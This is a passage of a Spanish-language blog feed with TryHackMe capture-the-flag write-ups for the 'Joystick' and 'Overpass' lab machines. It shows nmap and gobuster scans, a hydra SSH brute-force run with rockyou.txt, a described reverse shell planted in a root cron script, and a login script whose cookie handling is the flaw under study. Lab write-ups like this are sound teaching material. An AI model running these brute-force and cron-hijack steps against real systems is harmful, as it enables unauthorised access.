&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/joystick# ftp joystick.thm 
Connected to joystick.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;joystick.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;500&lt;/span&gt; OOPS: vsftpd: refusing to run with writable root inside chroot&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
Login failed.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;421&lt;/span&gt; Service not available, remote server has closed connection
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80, en el codigo fuente encontramos un mensaje que menciona el usuario &lt;code&gt;steve&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200716_235236.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/joystick# gobuster dir -u http://joystick.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;steve---user&#34;&gt;STEVE - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos hydra para hacer un ataque de fuerza bruta en el servicio ssh con el usuario &lt;code&gt;steve&lt;/code&gt; y el wordlist &lt;code&gt;rockyou.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/joystick# hydra -l steve -P /usr/share/wordlists/rockyou.txt ssh://joystick.thm -t &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
Hydra v9.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; by van Hauser/THC - Please &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting at 2020-07-17 01:12:12
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WARNING&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WARNING&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Restorefile &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;you have &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; seconds to abort... &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use option -I to skip waiting&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; from a previous session found, to prevent overwriting, ./hydra.restore
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DATA&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; max &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; tasks per &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; server, overall &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; tasks, &lt;span class=&#34;m&#34;&gt;14344399&lt;/span&gt; login tries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;l:1/p:14344399&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, ~224132 tries per task
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DATA&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; attacking ssh://joystick.thm:22/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;STATUS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 233.00 tries/min, &lt;span class=&#34;m&#34;&gt;233&lt;/span&gt; tries in 00:01h, &lt;span class=&#34;m&#34;&gt;14344194&lt;/span&gt; to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; in 1026:04h, &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; active
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;STATUS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 215.00 tries/min, &lt;span class=&#34;m&#34;&gt;645&lt;/span&gt; tries in 00:03h, &lt;span class=&#34;m&#34;&gt;14343800&lt;/span&gt; to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; in 1111:56h, &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; active
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;STATUS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 210.29 tries/min, &lt;span class=&#34;m&#34;&gt;1472&lt;/span&gt; tries in 00:07h, &lt;span class=&#34;m&#34;&gt;14342999&lt;/span&gt; to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; in 1136:48h, &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; active
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;STATUS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 207.53 tries/min, &lt;span class=&#34;m&#34;&gt;3113&lt;/span&gt; tries in 00:15h, &lt;span class=&#34;m&#34;&gt;14341391&lt;/span&gt; to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; in 1151:45h, &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; active
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;STATUS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 343.68 tries/min, &lt;span class=&#34;m&#34;&gt;10654&lt;/span&gt; tries in 00:31h, &lt;span class=&#34;m&#34;&gt;14333874&lt;/span&gt; to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; in 695:08h, &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; active
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;22&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;ssh&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; host: joystick.thm	login: steve 	password: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
^C
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ingresamos por SSH, obtenemos una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200717_004637.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;pspy64&lt;/code&gt; para ver los cronjobs que se encuentran en la maquina, encontramos que se ejecuta el archivo &lt;code&gt;/opt/minecraft/backup.sh&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200717_011404.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos una shell inversa al archivo y ponemos a la escucha netcat en nuestra maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200717_011554.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con el usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200717_011633.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos la flag &lt;code&gt;root.txt&lt;/code&gt; en &lt;code&gt;/home/notch&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200717_012234.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/joystick/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/joystick/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Overpass</title>
        <link>https://sckull.github.io/posts/overpass/</link>
        <pubDate>Wed, 22 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 22 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/overpass/</guid>
        <description>Overpass es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Overpass es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Overpass&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;What happens when some broke CompSci students make a password manager?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/NinjaJc01&#34;&gt;NinjaJc01&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Jul 17 16:58:39 2020 as: nmap -sV -o nmap_scan_mini overpass.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; overpass.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.144.83&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Golang net/http server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Go-IPFS json-rpc or InfluxDB API&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Jul 17 16:59:17 2020 -- 1 IP address (1 host up) scanned in 37.41 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_160249.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/overpass# gobuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/downloads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/aboutus &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/admin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/admin.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/404.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;admin&lt;/code&gt; encontramos un panel, en el codigo fuente de este encontramos un archivo de javascript el cual al enviar el usuario y contraseña este verifica si la respuesta es &lt;code&gt;&amp;quot;Incorrect Credentials&amp;quot;&lt;/code&gt;, si ese fuera el caso limpia el input de la contraseña, si la respuesta es diferente entonces establece una cookie con la respuesta.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_184436.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...]&lt;/span&gt;

&lt;span class=&#34;nx&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;usernameBox&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwordBox&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;loginStatus&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#loginStatus&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;loginStatus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;textContent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;creds&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;usernameBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwordBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;postData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/api/login&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;statusOrCookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusOrCookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Incorrect credentials&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;loginStatus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;textContent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Incorrect Credentials&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;passwordBox&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;Cookies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SessionToken&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;statusOrCookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/admin&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

